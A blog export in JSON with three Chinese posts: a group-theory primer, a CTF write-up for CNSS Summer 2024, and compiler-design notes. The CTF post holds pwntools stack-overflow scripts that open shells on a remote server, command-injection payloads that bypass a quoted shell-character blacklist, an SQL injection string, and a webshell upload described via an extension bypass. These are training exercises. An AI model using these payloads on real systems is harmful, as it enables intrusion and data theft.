{"posts":[{"title":"🍼Baby Group","text":"So, what is a group? 群是任意数学对象（字母、数字、函数、矩阵等）组成的集合再加上一种运算，满足以下四条定义： Closure（封闭性）：$a\\circ b=c$。集合中的任意两个元素运算仍在集合中。 Associativity（结合性）：$(a\\circ b)\\circ c=a\\circ (b\\circ c)$。 Neutral（单位元）：$a\\circ e=a$。 Inverse（逆元）：$a\\circ a^{-1}=e$。群中的每个元素都存在逆元。 整数集$\\mathbb{Z}$上的加法运算构成了一个群。中性元为 0，相反数即为逆元。 有理数集$\\mathbb{Q}/0$上的乘法运算也构成了一个群。中性元为 1，倒数即为逆元。 你可能意识到有理数集上的加法运算也构成一个群，所以我们有符号$Q^+$和$Q^×$. 一个群中的元素个数称为群的阶，$|Z|=|Q^+|=|Q^×|=\\infty$。 请注意，尽管加法和乘法都具备交换性，但并没有RULE规定群中的元素必须可交换。 $$e\\circ e=e$$ $$(e\\circ a)\\circ a^{-1}=a\\circ a^{-1}$$ 于是我们证明了Left Identity = Right Identity。$$(a^{-1})^{-1}=e\\circ(a^{-1})^{-1}=a\\circ a^{-1}\\circ (a^{-1})^{-1}=a\\circ e=a$$ $$a^{-1}\\circ a=a^{-1}\\circ (a^{-1})^{-1}=e$$ 于是我们证明了Left Inverse = Right Inverse。 群论中有很多反证法的使用。 证明群中的单位元唯一：假设有$e_1$和$e_2$，则$e_1=e_1\\circ e_2=e_2$。 证明群中元素的逆元唯一：假设有$a_1$和$a_2$，则$a_1=(a_2\\circ a)\\circ a_1=a_2\\circ e=a_2$。 有限群（finite group）$\\mathbb{Z}_n$表示$n$阶整数循环群，$|\\mathbb{Z}_n|=n$。比如模6同余$|\\mathbb{Z}_6|=6$中仅有元素0，1，2，3，4，5。 Dihedral Group：我们研究的数学对象是正多边形，这里我们选择正六边形。群中的元素是使六边形保持原位的变换空间的不同方法，“旋转”和“翻转后旋转”。 $|\\mathbb{D}_6|=12$，其中有0，60，120，180，240，300以及翻转后对应的6种旋转。$|\\mathbb{D}_n|=2n$。 此时，Dihedral Group不具备交换性，因为翻转和旋转的顺序决定了六边形的手性。 给顶点涂涂颜色再看看？在六边形里写下字母D吧！ 子群（subgroup）子群是群的一部分，并且其本身恰好是群。例如：偶数集，$\\mathbb{D}_6$中的旋转本身也构成一个子群，$\\mathbb{D}_3$也是子群，$\\mathbb{Z}_9$中有0、3、6这个子群。 元素$a$的生成子群&lt;$a$&gt;是指$a,a^2,a^3,…$。这只对有限群有效。比如将偶数群表示为2的生成子群时，我们对负偶数无能为力，需要额外添加单位元和逆元。 陪集（coset）整数群中，奇数集合可以由偶数群&lt;2&gt;整体平移1得到，我们称这样的集合为陪集。一个群确实算作自身的陪集。 回忆一下$\\mathbb{D}_6$，6个旋转方法构成一个子群，那么旋转后翻转，也就是&lt;旋转&gt;平移一个“翻转”的距离就构成了一个陪集。也可以把&lt;旋转&gt;平移一个旋转的距离，尽管这样做会把旋转子群内的元素打乱。 让我们继续这个游戏！&lt;翻转&gt;所生成的子群只有两个元素，翻转一次和翻转两次，显然翻转两次是中性元（什么也没做）。把翻转子群平移60度，就可以得到一个60度的旋转和一个300度旋转后翻转。 群和它的子群是高度对称的。 Lagrange’s Theorem假设现在有个群，群里有个子群，子群所衍生出的陪集可以整齐地将整个群划分为大小一样的块。 这里有两点是容易理解的： 陪集一定覆盖了整个群：因为无论你想得到哪个元素，只需平移对应的差值即可。 所有的陪集大小相同：平移时显然不会增加元素，那会不会减少呢？假设减少，我们一定可以用逆元把它们平移回去，这样就会凭空增加元素。 下面有一点是不那么显然的：所有的陪集不会相互重合。 假如你平移了一个子群中的元素，由于封闭性，得到的元素一定在子群里。那假如你平移了一个不在子群中的元素，结果会不会出现在子群里呢？ 例如子群中有$a、b$两个元素，假设$z\\circ a=b$，则$z=b\\circ a^{-1}$，因为$b$和$a^{-1}$均在子群里，所以与假设矛盾！！ 所以我们得到了一个二分论断：一个陪集要么与原来的子群完全不重合，要么它就是子群！ 同理可证此二分论断不仅在子群和陪集间，在陪集和陪集间同样成立。 （拉格朗日定理）对于群$G$和它的子群$H$，$H$的阶可以整除$G$的阶。 o.0 可是拉格朗日（1736—1813）在群论诞生前就… 对于一个素数$p$阶群，它的子群只能拥有1个或p个元素，那么它一定是循环群！！！ 史上最好的群论入门。","link":"/2024/07/28/%F0%9F%8D%BCBaby-Group/"},{"title":"⛱️CNSS Summer 2024","text":"Let’s Capture The Flag! 💥PwnPwn真是太有趣辣！从零开始的PWN之路！ 😯nc? nc!nc 152.136.11.155 10020 system(‘/bin/sh’)，直接netcat一键getshell，Linux连接，cat flag 12345$ nc 152.136.11.155 10020 Welcome to CNSS Recruit 2024!Start your journey to become a pwn master!cat flagcnss{Welcome_to_pwn_world!} 🤖Bot偷偷告诉你，CNSS娘bot里其实藏了一个人。 前任中之人Shino，随着年纪渐长，已经无法满足群友日益增长的水群需求。CNSS娘迫切需要新的接班人！ 为了不被群友识破，你需要按照操作规范水群：完成100次交互即可通过考核。 nc 152.136.11.155 10021 有个很好用的库叫pwntools！ 一道Pwntool交互题。程序的逻辑就是循环100次后跳出循环，执行system函数。在循环内部会执行broadcast或bot_ping这两个函数。 12345678910111213141516171819202122232425262728293031323334353637from pwn import *import rehost = '152.136.11.155'port = 10021p = remote(host, port)for i in range(100): data = p.recvline().decode() if '[SYSTEM]' in data: match = re.search(r'\\[SYSTEM\\]\\[(.*?)\\]\\((\\d+)pt\\)--\\[(.*?)\\]\\((\\d+)pt\\)', data) if match: player_id = match.group(1) player_score = int(match.group(2)) item_name = match.group(3) item_score = int(match.group(4)) expected_response = f&quot;Congratulations to {player_id} for passing [{item_name}], current score is {player_score + item_score} points!&quot; p.sendline(expected_response.encode()) elif '[USER]' in data: if '#ping' in data: p.sendline('pong!'.encode()) elif 'Too Slow' in data: print(&quot;Timeout or unexpected issue occurred.&quot;) break else: print(f&quot;Unhandled data: {data}&quot;)p.sendline(b'cat flag')p.interactive()&quot;&quot;&quot;cnss{GnAlPu8Q-KL65ZOTK-hahahaha-U9BvTeeI}&quot;&quot;&quot; 💓Overflow Me小数组要被塞满了！ nc 152.136.11.155 10022 123456789101112131415161718int __fastcall main(int argc, const char **argv, const char **envp){ _BYTE buf[16]; // [rsp+0h] [rbp-20h] BYREF __int64 v5; // [rsp+10h] [rbp-10h] unsigned __int64 v6; // [rsp+18h] [rbp-8h] v6 = __readfsqword(0x28u); my_init(argc, argv, envp); puts(&quot;Over flow me pls:&quot;); read(0, buf, 0x20uLL); if ( v5 != 114514 ) { puts(&quot;wrong,try again&quot;); exit(0); } system(&quot;/bin/sh&quot;); return 0;} 最基础的栈溢出。 123456789101112131415from pwn import *host = '152.136.11.155'port = 10022p = remote(host, port)padding = 16payload = b'p' * padding + p64(114514)p.sendlineafter('Over flow me pls:', payload)p.sendline(b'cat flag')p.interactive()&quot;&quot;&quot;cnss{Kz20UZyn-TNTfrc4Z-jiejiejie-sDwO2bC0}&quot;&quot;&quot; 🔍Reverse这个夏天，我第一次接近了那个女人。 😍那个女人上课的时候Shino老师讲了一个工具可以用来逆向软件，但是Timlzh忘掉软件叫什么了，只记得头像是那个女人…… 成功安装IDA Pro，打开即得flag 1CNSS{Sh3_1s_IDA!W3lc0m3_t0_Rev3rse_W0rld!} 😭我的flag碎了一地我的flag碎掉了，你能帮我找回来吗？ 用IDA打开找flag、学会在IDA中使用F5。 打开IDA发现三个hint，Shift+F12能打开Strings，找到第一部分；左侧Functions栏上方找到第二部分；根据提示，X查看交叉引用，找到funs718，F5看到 1234567891011121314151617int func718(){ puts(&quot;718&quot;); br0ken_4parT_(); putchar(66); putchar(117); putchar(55); putchar(95); putchar(89); putchar(48); putchar(117); putchar(95); putchar(99); putchar(64); putchar(110); return putchar(95);} 这里putchar给的不完整，退回去能看到完整的最后一部分，拿到flag 1CNSS{My_fl@g_h4s_br0ken_4parT_Bu7_Y0u_c@n_f1x_1t!} ✈️打飞机高手你会打飞机吗？高分有奖哦！✈️ Patch Program 找程序漏洞，修改逻辑以出现flag 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768int __fastcall main(int argc, const char **argv, const char **envp){ _main(argc, argv, envp); Startup(); while ( IsOver ) { UpdateInput(); UpdateNormal(); Show(); } printf(&quot;\\t\\tYou Are so WEAK!\\n&quot;); Sleep(0x9C4u); system(&quot;pause&quot;); return 0;}int Show(){ int result; // eax int j; // [rsp+28h] [rbp-8h] int i; // [rsp+2Ch] [rbp-4h] HideCursor(); gotoxy(1LL, 1LL); for ( i = 0; i &lt;= 26; ++i ) { for ( j = 0; j &lt;= 61; ++j ) { switch ( canvas[62 * i + j] ) { case 1: printf(&quot;*&quot;); break; case 2: printf(asc_14001301C); break; case 3: printf(&amp;asc_14001301C[2]); break; case 0xFFFFFFFF: printf(&amp;asc_14001301C[4]); break; default: if ( canvas[62 * i + j] ) { if ( canvas[62 * i + j] == 4 ) printf(&amp;asc_14001301C[8]); } else { printf(&amp;asc_14001301C[6]); } break; } } printf(&amp;asc_14001301C[10]); } printf(&quot;\\nScore: %d&quot;, score); result = score; if ( score &gt; 1145141918 ) { printf(&quot;\\t\\tWell Done! You got the flag!\\n\\t\\t&quot;); get_flag(); // 发现可疑函数!!! Sleep(0x9C4u); return system(&quot;pause&quot;); } return result;} 在函数开头直接放上可疑函数即可，Edit-Patch Program-Assemble，右键、退出、鼠标点击空白处就可以看到变化后的代码，最后记得Apply Patches to… 运行修改好的exe程序，拿到flag 1cnss{w0w_y0u_4r3_7he_m4st3r_0f_h1tt1ng_p1an3s!} ♾️亦真亦或亦假尊嘟假嘟? O.o 纯加密题，根据题目不难猜是异或相关的。IDA打开以后Ctrl+F查一下main函数，看一下代码逻辑 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748int __fastcall main(int argc, const char **argv, const char **envp){ _QWORD v4[12]; // [rsp+20h] [rbp-60h] BYREF int v5; // [rsp+80h] [rbp+0h] _QWORD v6[12]; // [rsp+90h] [rbp+10h] BYREF int v7; // [rsp+F0h] [rbp+70h] int i; // [rsp+FCh] [rbp+7Ch] _main(argc, argv, envp); v6[0] = 0x731047656E6F7579LL; v6[1] = 0x761B45794B10407DLL; v6[2] = 0x6E005B71491F585FLL; v6[3] = 0x45045205575D01LL; memset(&amp;v6[4], 0, 64); v7 = 0; memset(v4, 0, sizeof(v4)); v5 = 0; printf(&quot;Input your flag: &quot;); scanf(&quot;%s&quot;, v4); eNc0d3(v4); // 发现可疑点，这里对v4进行了加密 for ( i = 0; i &lt;= 30; ++i ) { if ( *((_BYTE *)v4 + i) != *((_BYTE *)v6 + i) ) { printf(&quot;Wrong!\\n&quot;); return 0; } } printf(&quot;Correct!\\n&quot;); return 0;}__int64 __fastcall eNc0d3(__int64 a1){ __int64 result; // rax int i; // [rsp+8h] [rbp-8h] int v3; // [rsp+Ch] [rbp-4h] v3 = 26; for ( i = 0; ; ++i ) { result = *(unsigned __int8 *)(a1 + i); if ( !(_BYTE)result ) break; *(_BYTE *)(i + a1) = v3++ ^ *(_BYTE *)(a1 + i); } return result;} 加密是一个循环，读取flag地址加上i偏移位置的一个字节。将v3和读取到的字节进行异或，结果写回到同一位置。 主函数循环是在比较加密后v4和v6的前30个字节是否相同，也就是给我们密文v6，还原明文即可。 123456789101112131415161718#include &lt;stdio.h&gt;int main() { char c[32]; *(long long *)&amp;c[0] = 0x731047656E6F7579LL; *(long long *)&amp;c[8] = 0x761B45794B10407DLL; *(long long *)&amp;c[16] = 0x6E005B71491F585FLL; *(long long *)&amp;c[24] = 0x45045205575D01LL; int v3 = 26; for (int i = 0; i &lt; 31; i++) { c[i] ^= v3++; } printf(&quot;%s&quot;, c); return 0;}/* cnss{X0R_c4n_b3_us3d_t0_3nc0d3} */ 🍵茶杯头大冒险爱养生的Timlzh带着他的茶杯头来向你求助，你能帮他找到他心爱的茶壶吗😔 纯加密题，搜了一下应该是属于TEA加密，闻所未闻，看一下代码逻辑 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970int __fastcall main(int argc, const char **argv, const char **envp){ _DWORD Str[8]; // [rsp+20h] [rbp-60h] BYREF _DWORD v5[8]; // [rsp+40h] [rbp-40h] unsigned int v6[6]; // [rsp+60h] [rbp-20h] BYREF int j; // [rsp+78h] [rbp-8h] int i; // [rsp+7Ch] [rbp-4h] _main(argc, argv, envp); v6[0] = 429459223; v6[1] = 537200643; v6[2] = 537462290; v6[3] = 537006083; v5[0] = -999025570; v5[1] = 970203505; v5[2] = -181949973; v5[3] = -483739382; v5[4] = 1062983671; v5[5] = -697079924; printf(&quot;input the flag: \\n&quot;); scanf(&quot;%s&quot;, Str); if ( strlen((const char *)Str) == 24 ) { for ( i = 0; i &lt;= 4; ++i ) encrypt(&amp;Str[i], v6); for ( j = 0; j &lt;= 5; ++j ) { if ( Str[j] != v5[j] ) { printf(&quot;it's not my teapot!&quot;); return 0; } } printf(&quot;Oh my god, you made it?!&quot;); system(&quot;pause&quot;); return 0; } else { printf(&quot;the length is NSFW~~~&quot;); return 0; }}__int64 __fastcall encrypt(unsigned int *a1, unsigned int *a2){ __int64 result; // rax unsigned int i; // [rsp+10h] [rbp-10h] unsigned int v4; // [rsp+14h] [rbp-Ch] unsigned int v5; // [rsp+18h] [rbp-8h] unsigned int v6; // [rsp+1Ch] [rbp-4h] v6 = *a1; v5 = a1[1]; v4 = 0; for ( i = 0; i &lt;= 0x1F; ++i ) { v6 += (((v5 &gt;&gt; 5) ^ (16 * v5)) + v5) ^ (a2[v4 &amp; 3] + v4); v4 += 289739793; v5 += (((v6 &gt;&gt; 5) ^ (16 * v6)) + v6) ^ (a2[(v4 &gt;&gt; 11) &amp; 3] + v4); } *a1 = v6; result = v5; a1[1] = v5; return result;} 加密过程a1是明文，a2是密钥。 1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;void decrypt(uint32_t* v, const uint32_t* key) { uint32_t v0 = v[0], v1 = v[1]; const uint32_t delta = 0x11451411; uint32_t sum = delta * 32; for (int i = 0; i &lt; 32; i++) { v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum &gt;&gt; 11) &amp; 3]); sum -= delta; v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]); } v[0] = v0; v[1] = v1;}int main() { uint32_t key[4] = {429459223, 537200643, 537462290, 537006083}; uint32_t enc[6] = {0xC474145E, 0x39D42171, 0xF527A9EB, 0xE32AB90A, 0x3F5BD7F7, 0xD673678C}; for (int i = 4; i &gt;= 0; i--) { decrypt(&amp;enc[i], key); } for (int i = 0; i &lt; 6; i++) { printf(&quot;%c%c%c%c&quot;, enc[i] &amp; 0xFF, (enc[i] &gt;&gt; 8) &amp; 0xFF, (enc[i] &gt;&gt; 16) &amp; 0xFF, (enc[i] &gt;&gt; 24) &amp; 0xFF); } putchar('\\n'); return 0;}/* cnss{Enj0y_te4_W!th_me!} */ 💥爆了爆了，和 JAVA 爆了啊？逆向还要学 Java？ 非常简单且入门的安卓逆向 你需要了解apk文件结构 JEB或JADX的使用 以及简单的java语法 JADX打开，翻找一通，找到com.cnss.myapplication，就是这道题的关键了。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586class Test: def __init__(self): self.str = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/'] def main(self): a = [ &quot;SJNPhthkmYBHow5Y75wRDa==&quot;, &quot;RoBAU/g/jlxuy+Ns1YtA86==&quot;, &quot;YZNTjQcHgoBaqf5hyYtM0K==&quot;, &quot;Z1Z/gv18ro1pkgF2rX5x+6==&quot;, ...#100个 &quot;bXF7hfV5smIOu/1q159Q16==&quot;, &quot;c441i+Z6r55Lmf9H4V=XD===&quot;, &quot;aY1MmRldcYRrtdlh50RJC===&quot;, &quot;Y5dYaAcAjoBtug1NwYFUBa==&quot;, &quot;TIk6kw9/pnZ41eRs1IZr4a==&quot;, &quot;cIU9ZQpjiINPy/kOw31OEa==&quot; ] for i in range(100): s = self.decode(a[i]) print(a[i]) print(s) def decode(self, code): length = len(code) if length == 0 or length % 4 != 0: return None end_equal_num = 0 if code.endswith(&quot;==&quot;): end_equal_num = 2 elif code.endswith(&quot;=&quot;): end_equal_num = 1 code = code.replace('=', '0') result = [] block_num = length // 4 for i in range(block_num): after_decode = self.decode_detail(code[i * 4:(i * 4) + 4]) if after_decode: result.append(after_decode) result_str = ''.join(result) return result_str[:len(result_str) - end_equal_num] def decode_detail(self, s): if len(s) != 4: return None a1 = self.get_index(s[0]) self.qwq() a2 = self.get_index(s[1]) self.qwq() a3 = self.get_index(s[2]) self.qwq() a4 = self.get_index(s[3]) self.qwq() b = [ chr((a1 &lt;&lt; 2) | ((a2 &amp; 48) &gt;&gt; 4)), chr(((a2 &amp; 15) &lt;&lt; 4) | ((a3 &amp; 60) &gt;&gt; 2)), chr(((a3 &amp; 3) &lt;&lt; 6) | a4) ] return ''.join(b) def get_index(self, c): try: return self.str.index(c) except ValueError: return -1 def qwq(self): tmp = [None] * 64 for i in range(len(self.str)): tmp[i] = self.str[(i + 2) % 64] self.str = tmp.copy()if __name__ == &quot;__main__&quot;: test = Test() test.main() 根据提示，key is a meaningful sentence，写个python脚本解一下base64，得到密钥。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from base64 import b64decodefrom Crypto.Cipher import AESfrom Crypto.Util.Padding import unpaddef decode(code): if len(code) == 0 or len(code) % 4 != 0: return None end_equal_num = 0 if code.endswith(&quot;==&quot;): end_equal_num = 2 elif code.endswith(&quot;=&quot;): end_equal_num = 1 code = code.replace('=', '0') decoded_str = '' for i in range(0, len(code), 4): decoded_str += decode_detail(code[i:i+4]) result = decoded_str[:-end_equal_num] return resultdef decode_detail(encoded_str): str_chars = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot; a1 = str_chars.index(encoded_str[0]) a2 = str_chars.index(encoded_str[1]) a3 = str_chars.index(encoded_str[2]) a4 = str_chars.index(encoded_str[3]) b = chr(((a1 &lt;&lt; 2) | ((a2 &amp; 48) &gt;&gt; 4))) + \\ chr(((a2 &amp; 15) &lt;&lt; 4) | ((a3 &amp; 60) &gt;&gt; 2)) + \\ chr(((a3 &amp; 3) &lt;&lt; 6) | a4) return bdef qvq(key_str): cipher_text = b64decode(&quot;11VaDwVeOwKvL6eqb2hsA2rb0wTbTRwsb7WirGpBW8s=&quot;) key = key_str.encode('utf-8') cipher = AES.new(key, AES.MODE_ECB) decrypted_data = unpad(cipher.decrypt(cipher_text), AES.block_size) return decrypted_data.decode('utf-8')key = &quot;I am CNSS AESkey&quot;decrypted_message = qvq(key)print(decrypted_message)&quot;&quot;&quot;cnss{We1c0Me t0 Andorid Rev!}&quot;&quot;&quot; 🕸️Web做密码题的时候遇到很多和web交互的情况，遂前来学习。不会Web，打着玩的。 🦴babyHTTPpsych 上课开小差，下课之后同桌说今天学的 HTTP 请求，然而 psych 并不知道这个知识点，请你帮他完成作业，获得 flag 。 HTTP 请求有什么内容呢？ 一张图说明访问网站的流程 硬核！30 张图解 HTTP 常见的面试题 cURL是一种通过命令行或脚本进行数据传输的工具，支持多种协议，可以用来发送http请求，获取服务器响应。（还有其他功能） -i(--include)选项在输出中包含服务器返回的HTTP响应头信息。-v(--verbose)选项显示请求的详细信息和调试信息。 123456$ curl &quot;http://152.136.11.155:10101/&quot;Please GET me a CNSS with a value of 'hackers'.$ curl &quot;http://152.136.11.155:10101/?CNSS=hackers&quot;And I need you POST a web with a value of 'fun'.$ curl &quot;http://152.136.11.155:10101/?CNSS=hackers&quot; -X POST -d &quot;web=fun&quot; Do you know cookie?You are not admin! 关于cookie我们-i看一下，找到Set-Cookie: admin=false，改成true就行了。 12$ curl &quot;http://152.136.11.155:10101/?CNSS=hackers&quot; -X POST -d &quot;web=fun&quot; -b &quot;admin=true&quot;CNSS{w2b_!s_Reai1y_7un!!!} 御林的题还考了Referer，提示我们You must come from “YulinSec://127.0.0.1” 1$ curl curl &quot;http://101.35.209.40:44505/?key1=YulinSec&quot; -X POST -d &quot;key2=YulinSec&quot; -H &quot;Referer:YulinSec://127.0.0.1&quot; 关于302跳转重定向的题，看源码提示我们flag位于/302.php下，直接curl即可查到flag。HTTP OPTIONS Method 🙋🏼‍♀️PHPinfoCNSS娘！phpinfo文件是什么呀！ 如何创建phpinfo文件并查看PHP信息 – WordPress大学 (wpdaxue.com) 直接在URL后添加/phpinfo.php查找即可。 1cnss{l3t_u5_l3arn_php!nfo!} 🥇我得再快点考验手速的时候到了 scRsCrIptiPt 看了网页的源代码，使用javascript实现一个自动刷新的页面，GET传参到/check就行了。 12345&lt;p&gt;Key : 6Dd3LzGVhvEn8wv&lt;span id=&quot;variable&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;form action=&quot;/check&quot; method=&quot;GET&quot;&gt; &lt;input type=&quot;text&quot; id=&quot;value&quot; name=&quot;value&quot; required&gt; &lt;button type=&quot;Flag&quot;&gt;Flag&lt;/button&gt; &lt;/form&gt; 机器的确是比人快呀！写一个python脚本，Requests库与网站进行交互。 12345678910111213141516171819202122232425262728293031import requestsimport hashliburl = 'http://152.136.11.155:10103'submit_url = 'http://152.136.11.155:10103/check'def get_md5_hash(): try: content = requests.get(url).text key = content.split('Key : ')[1].split('&lt;span id=&quot;variable&quot;&gt;')[0].strip() return hashlib.md5(key.encode()).hexdigest() except requests.RequestException as e: print(f&quot;Error: {e}&quot;) return Nonedef submit_md5(md5_hash): try: return requests.get(submit_url, params={'value': md5_hash}).text except requests.RequestException as e: print(f&quot;Error: {e}&quot;) return Noneif __name__ == &quot;__main__&quot;: md5_hash = get_md5_hash() if md5_hash: result = submit_md5(md5_hash) if result: print(result)&quot;&quot;&quot;cnss{3njoy_py5crIpt_n0w!!}&quot;&quot;&quot; 🏓Pingpsych：#pingCNSS娘：pong! 连上之后只有一段PHP代码： 12345if (isset($_POST['ip'])) { $ip = $_POST['ip']; $ping_result = ping($ip); echo nl2br($ping_result); } 很明显这是让我们用POST方法传一下ip地址，然后服务器执行ping函数。试一下： 12345678$ curl &quot;http://152.136.11.155:10104/&quot; -X POST -d &quot;ip=127.0.0.1&quot;PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.&lt;br /&gt;64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.046 ms&lt;br /&gt;64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.039 ms&lt;br /&gt;&lt;br /&gt;--- 127.0.0.1 ping statistics ---&lt;br /&gt;2 packets transmitted, 2 received, 0% packet loss, time 31ms&lt;br /&gt;rtt min/avg/max/mdev = 0.039/0.042/0.046/0.007 ms 发现有回显，但过于正常。通过搜索ctf web ping得知，可以使用命令连接符尝试列目录。于是 1234$ curl &quot;http://152.136.11.155:10104/&quot; -X POST -d &quot;ip=127.0.0.1;ls&quot;Error: Invalid input.$ curl &quot;http://152.136.11.155:10104/&quot; -X POST -d &quot;ip=127.0.0.1;&quot;Error: Invalid input. 不幸又幸运的是，我们知道分号;被滤掉了。开搜！ 12$ curl &quot;http://152.136.11.155:10104/&quot; -X POST -d &quot;ip=127.0.0.1%0als&quot;index.php 出现了，emmm，不是想要的。别急，看看怎么个事儿：哎，空格也被过滤了。 1$ curl &quot;http://152.136.11.155:10104/&quot; -X POST -d &quot;ip=127.0.0.1%0acat%09index.php&quot; 12345678910111213141516171819202122232425262728293031323334353637function validate_input($input) {$invalid_chars = array(&quot;sh&quot;,&quot;bash&quot;,&quot;chown&quot;,&quot; &quot;, &quot;chmod&quot;, &quot;echo&quot;, &quot;+&quot;, &quot;&amp;&quot;,&quot;;&quot;, &quot;|&quot;, &quot;&gt;&quot;, &quot;&lt;&quot;, &quot;`&quot;, &quot;\\\\&quot;, &quot;\\&quot;&quot;, &quot;'&quot;, &quot;(&quot;, &quot;)&quot;, &quot;{&quot;, &quot;}&quot;, &quot;[&quot;, &quot;]&quot;);foreach ($invalid_chars as $invalid_char) {if (strpos($input, $invalid_char) !== false) {return false;}}if (preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $input)) {return false;}return true;}function ping($ip_address) {if (!validate_input($ip_address)) {return &quot;Error: Invalid input.&quot;;}$cmd = &quot;ping -c 2 &quot; .$ip_address;exec($cmd, $output, $return_code);if ($return_code !== 0) {echo(&quot;Error: Failed to execute command.&quot;);}return implode(&quot;\\n&quot;, $output);}if (isset($_POST['ip'])) {$ip = $_POST['ip'];$ping_result = ping($ip);echo nl2br($ping_result); // 输出ping结果并保留换行}?&gt; 总算看到过滤层了。去其TA目录看看吧。 哈？哈！Here it is！来来让我们cat一下： 12curl &quot;http://152.136.11.155:10104/&quot; -X POST -d &quot;ip=1.1.1.1%0acat%09../../../f*&quot;CNSS{p0ng_pong_p0ng!!!} 在这之前我一直尝试网上搜到的各种绕过flag限制的方法，直到fan✌️一句话点醒了我 学到了，谢谢宝宝（啾咪）&gt; 🐶CNSS娘の宠物商店CNSS娘开始创业啦！CNSS娘の宠物商店正式开业！ CNSS娘的账号是 admin , 登陆查看CNSS娘藏在后台的秘密…… sql注入' or 1='1。 1CNSS{h0w_d0_y0u_637_7h3_p455w0rd1?} 🎮20482048真好玩，玩到1000000分就能拿到flag！ 不是，你真玩啊？ 禁了F12和右键，Ctrl+Shift+I打开控制台，查看Flag按钮的HTML标签，注意到 1&lt;input type=&quot;button&quot; onclick=&quot;getflag()&quot; value=&quot;Flag&quot;&gt; 在Sources的main2048.js中查到getflag()函数（以及下面各种屏蔽），发现是一堆乱码。想法是找到判断点1000000分但是没查到，复制下来转去查score，发现 1if(score&gt;=0xf4240) 这个0xf4240刚好是1000000，给它改成0再按一下Flag按钮即可拿到flag。 1cnss{3asy_fr0nt_kn0w1edge!!!} 👤换个头像先CNSS娘这么可爱，你确定要把她换掉吗？ 真的只能上传图片吗？ 账号密码都是admin登陆，上传一句话木马。改一下后缀绕过检查，先把php改成png，上蚁剑连接getshell。 🧩Misc没怎么做，也做不出来，笑死。做出来一道音频隐写还有一道Word文档查时间的题。 很有趣的一次经历，嘻嘻&gt;.&lt;","link":"/2024/09/07/%E2%9B%B1%EF%B8%8FCNSS-Summer-2024/"},{"title":"🎻Compiler Design","text":"I’ve never had fun playing in a compiler. 编译器概述编译器将高级语言翻译成汇编语言，再进行汇编和链接后得到能在机器上运行的二进制文件。 而解释器则一边接受一边执行。 编译器结构常见的编译器结构： 前端 (FrontEnd)：主要使用 flex 和 bison。通过词法和语法分析，将源代码（SRC）解析成抽象语法树（AST）。通过语义分析，扫描 AST 以检查是否存在语义错误。 中端 (MidEnd)：中间表示 (IR) 是一种较低层次的代码格式，简化了原始源代码的结构，使得后端处理更为简便（复杂度从 M*N 降至 M+N）。在此阶段进行优化，例如死代码消除（DCE）、常量传播等。 后端 (BackEnd)：将优化后的 IR 转换成目标架构（特定机器）的汇编代码（ASM）。 综上，实现一个编译器包括：词法分析、语法分析、语义分析、中间代码生成、中间代码优化、目标代码生成以及目标代码优化。 其中，符号表是用来保存已收集信息的数据结构。包括名字域和信息域，一个线性表或hash表。 符号表介绍名字域的实现方式： 直接存储：每个标识符分配一个最大的允许空间。即，每个名字在符号表中占用固定的存储空间，哪怕名字很短也会分配满空间，容易导致空间浪费。 间接表技术：名字域存放指针。这种方法使用额外的指针或者索引，将名字域的内容存储在独立的空间中，可以有效节约存储空间。符号表存储的不是标识符本身，而是一个指针或索引，指向存储标识符实际内容的区域。 属性域是符号表中记录标识符（如变量、函数、符号等）详细信息的地方。它包含多个子域，每个子域存储标识符的不同属性，如类型、初始值、地址等。标志位是用来标记某些属性是否存在或某些状态（如初始化、存储类型）的字段。 符号表中的单词记号包括标识符、数字、符号等。变量：类型？有初值？函数：返回类型？参数个数、类型等。标号：标号地址、转移地址。 简单编译器一个简单编译器举例，源语言：加法表达式语言Sum；两种语法形式：整型数字n和加法e1+e2；目标机器：栈式计算机Stack，可执行两条指令：push n; add。 词法分析词法分析功能：扫描源程序，识别单词符号，发现词法错误，输出错误信息。 词法分析器读入一段字符流(byte stream)输出一段记号流(token stream)。也可以在语法分析器需要的时候取一个单词返回一个单词。输出单词的类别和属性。 1234if (x &gt; 5) //换行符 y = &quot;hello&quot;;else z = 1; 终结符：关键字、标识符、运算符等等。 手动实现转移图： 双层代表识别结束，星号表示向前的一次回退。 123456789101112enum kind {IF, LPAREN, ID, INTLIT, ...}; //枚举类型的值会被编码成整型数struct token { enum kind k; char *lexeme; //存标识符的值};token next_token();c = getchar();switch (c): case '&lt;': c = getchar(); switch (c): ... case '=': //... 标识符的转移图： 如何区分标识符和关键字呢？ 对给定语言中所有的关键字，构造关键字构成的哈希表H。对所有的标识符和关键字，先统一按标识符的转移图进行识别。识别完成后，进一步查表看是否是关键字。通过合理的构造哈希表H(完美哈希)，可以O(1)时间完成。 正则表达式如何自动生成一个词法分析器呢？用一个工具，输入是声明式的规范，输出是一个词法分析器。 引入**语法糖(syntax sugar)**来简化构造： 有限状态自动机 确定的有限状态自动机（DFA）：是一个加权重（边和节点需保存信息）的有向图。 非确定的有限状态自动机（NFA）： 